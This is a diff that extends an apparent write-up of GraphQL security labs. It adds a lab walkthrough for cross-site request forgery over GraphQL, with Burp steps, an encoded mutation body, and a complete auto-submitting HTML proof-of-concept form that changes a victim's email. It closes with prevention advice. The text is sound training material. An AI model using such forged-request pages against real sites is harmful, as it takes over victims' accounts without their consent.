@@ -501,6 +501,10 @@ In Repeater, change to GraphQL tab and edit `id` variable and set it to `3`. Sen
 
 > NOTE: Check out [walkthrough](graphql_lab03_zaproxy.md) of this lab in OWASP Zed Attack Proxy
 
+> Check out this [primer](primer/README.md) I wrote for using GraphQL schema to build queries.
+
+> Check out this neat little [tool](https://github.com/gremlin-0x/gql_viper) I wrote to automatically get GraphQL schema and build queries for a specified HTTP method. 
+
 ## Bypassing rate limiting using aliases
 
 Normally, GraphQL objects aren't allowed to have multiple fields with the same name. However, by using __aliases__, you can work around this limitation by assigning unique names to each field you want the API to return. This allows you to request several instances of the same object type with a single query. 
@@ -612,4 +616,147 @@ Check which password was used in the alias `bruteforce55`, log in as `carlos` wi
 
 > NOTE: Check out [walkthrough](graphql_lab04_zaproxy.md) of this lab in OWASP Zed Attack Proxy
 
+## GraphQL CSRF
 
+Cross-site request forgery (CSRF) is a vulnerability that allows attackers to trick users into carrying out uninteded actions. This typically involves a malicious website sending unauthorized requests to a vulnerable application on behalf of the user. 
+
+In the context of GraphQL, CSRF can be exploited by crafting an attack that triggers a user's browser to submit a harmful GraphQL query, making it appear as though the user initiated it. 
+
+### How do CSRF over GraphQL vulnerabilities arise?
+
+CSRF vulnerabilities can occur when a GraphQL endpoint doesn't check the request's content type and lacks CSRF token protections.
+
+Requests using the `application/json` content type are generally safe from CSRF as long as the server enforces strict content-type validation. In such cases, a malicious site cannot trick the victim's browser into sending these requests. 
+
+However, requests made with methods like `GET` or with a content type of `x-www-form-urlencoded` _can_ be triggered by a browser. If the GraphQL endpoint accepts these formats, it may be vulnerable to CSRF attacks, allowing attackers to craft and deliver malicious requests to the API. 
+
+The process of carrying out a CSRF attack on a GraphQL endpoint is essentially the same as with traditional CSRF attacks.
+
+### Lab: performing CSRF exploits over GraphQL
+
+Open Burp's browser, access the lab and log in as `wiener:peter`. Update email with a new email address. 
+
+In __Proxy__ > __HTTP history__ find the latest `POST /graphql/v1` request, with body:
+
+```json
+{"query":"\n    mutation changeEmail($input: ChangeEmailInput!) {\n        changeEmail(input: $input) {\n            email\n        }\n    }\n","operationName":"changeEmail","variables":{"input":{"email":"attacker@fakemail.com"}}}
+```
+
+The email change is sent as a GraphQL mutation. Right-click this request and "Send to Repeater". Go to GraphQL tab within the request pane and change the value of __Variable__ email to a different email address. Send the request and notice that it changed the email:
+
+```
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 88
+
+{
+  "data": {
+    "changeEmail": {
+      "email": "attacker@notfakemail.com"
+    }
+  }
+}
+```
+
+This indicates that a session cookie can be reused to send multiple requests. 
+
+Convert the request into a `POST` request with a `Content-Type` of `x-www-form-urlencoded`. To do this, right-click the request and select __Change request method__ twice. 
+
+Notice that the mutation request body has been deleted. Add the request body back in with URL encoding:
+
+```
+query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
+```
+
+In the browser, navigate to __exploit server__ and paste the following HTML backbone for a CSRF PoC:
+
+```html
+<html>
+  <form action="https://YOUR-LAB-ID.web-security-academy.net/graphql/v1" method="POST">
+    <input type="hidden" name="" value="">
+    <input type="hidden" name="" value="">
+    <input type="hidden" name="" value="">
+  </form>
+  <script>
+
+  </script>
+</html>
+```
+
+Now carefully follow this:
+- Identify parameter _names_ and _values_ in the request body above. 
+- Copy and paste the __names__ into the three `<input name=""` fields.
+- Copy each __value__ one by one, go to __Decoder__, URL decode it first, and encode as HTML. Then copy and paste it in the `<input value=""` field.
+
+The final PoC should look like this:
+
+```html
+<html>
+  <form action="https://YOUR-LAB-ID.web-security-academy.net/graphql/v1" method="POST">
+    <input type="hidden" name="query" value="&#x0a;&#x20;&#x20;&#x20;&#x20;&#x6d;&#x75;&#x74;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x63;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x28;&#x24;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x3a;&#x20;&#x43;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x49;&#x6e;&#x70;&#x75;&#x74;&#x21;&#x29;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x63;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;&#x28;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x3a;&#x20;&#x24;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x29;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7d;&#x0a;">
+    <input type="hidden" name="operationName" value="&#x63;&#x68;&#x61;&#x6e;&#x67;&#x65;&#x45;&#x6d;&#x61;&#x69;&#x6c;">
+    <input type="hidden" name="variables" value="&#x7b;&#x22;&#x69;&#x6e;&#x70;&#x75;&#x74;&#x22;&#x3a;&#x7b;&#x22;&#x65;&#x6d;&#x61;&#x69;&#x6c;&#x22;&#x3a;&#x22;&#x68;&#x61;&#x63;&#x6b;&#x65;&#x72;&#x40;&#x68;&#x61;&#x63;&#x6b;&#x65;&#x72;&#x2e;&#x63;&#x6f;&#x6d;&#x22;&#x7d;&#x7d;">
+  </form>
+  <script>
+
+  </script>
+</html>
+```
+
+One last thing. Inside the `<script></script>` block add:
+
+```javascript
+document.forms[0].submit();
+```
+
+Once your PoC is ready, click "Store" and then "View exploit". You will be redirected to a GraphQL API response:
+
+```json
+{
+  "data": {
+    "changeEmail": {
+      "email": "hacker@hacker.com"
+    }
+  }
+}
+```
+
+This indicates that your email was changed with this this PoC. To check it go to `/my-account`:
+
+```
+Your username is: wiener
+
+Your email is: hacker@hacker.com
+```
+
+So change the value of `<input name="variables" value="">` to a different email. Simply copy the initial value from __Repeater__'s request body, go to __Decoder__, URL decode, input any email you haven't used yet, encode as HTML and replace it in the __exploit server__. 
+
+Once that's done, click "Deliver to victim" to solve the lab. 
+
+> NOTE: Check out [walkthrough](graphql_lab05_zaproxy.md) of this lab in OWASP Zed Attack Proxy
+
+## Preventing GraphQL attacks
+
+To defend against many common GraphQL attacks, apply the following best practices when deploying your API in a production environment:
+
+- _Disable introspection_ if your API isn't meant to be accessed by the public. This limits the information available to attackers and helps prevent uninteded data exposure. 
+- _If your API is public-facing_, you may need to keep introspection enabled for legitimate use. In this case, carefully audit your schema to ensure no sensitive or unintended fields are exposed.
+- _Turn off suggestions_, which are used by tools like Clairvoyance to uncover hidden parts of your schema.
+- _Avoid exposing private user information_ in your schema, such as email addresses or user IDs.
+
+## Preventing GraphQL brute-force attacks
+
+GraphQL APIs can sometimes be used to bypass conventional rate limiting mechanisms --- particularly through techniques like using aliases. To help protect your API from brute force attempts and potential denial-of-service (DoS) attacks, it's important to implement defensive design strategies.
+
+To mitigate brute force risks:
+- _Enforce query depth limits_ --- query depth refers to how many levels of nested fields a query includes. Deeply nested queries can degrade performance and increase the risk of DoS attacks. Limiting the maximum depth helps prevent these issues.
+- _Set operation limits_ --- define upper limits on the number of distinct fields, aliases and top-level operations your API accepts in a single request.
+- _Restrict query size_ --- impose a cap on the total byte size of incoming queries to help prevent abuse via oversized payloads.
+- _Use cost analysis_ --- this technique evaluates how resource-intensive a query will be before executing it. If a query is deemed too costly, the API can reject it preemptively.
+
+## Preventing CSRF over GraphQL
+
+To protect against GraphQL-specific CSRF vulnerabilities, ensure that your API only accepts JSON-encoded `POST` requests, strictly validates that the content matches the declared content type, and implements a robust CSRF token mechanism to prevent unauthorized cross-origin requests.
+
+> Next write-up: [Cross-origin resource sharing (CORS)](../psa_cors/README.md)
